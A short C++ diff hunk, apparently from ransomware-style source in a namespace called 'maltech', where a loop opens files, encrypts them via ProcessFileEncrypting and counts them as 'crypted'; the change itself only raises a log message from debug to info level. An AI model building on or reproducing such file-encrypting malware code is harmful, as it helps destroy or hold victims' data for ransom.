@@ -99,7 +99,7 @@ namespace maltech {
                 HANDLE hFile = OpenFile(path);
                 ProcessFileEncrypting(hFile);
                 ++crypted_count_;
-                LOG_DEBUG("[crypted] - " + std::string(path));
+                LOG_INFO("[crypted] - " + std::string(path));
             }
             catch (const std::exception& e) {
                 LOG_ERROR(e.what());
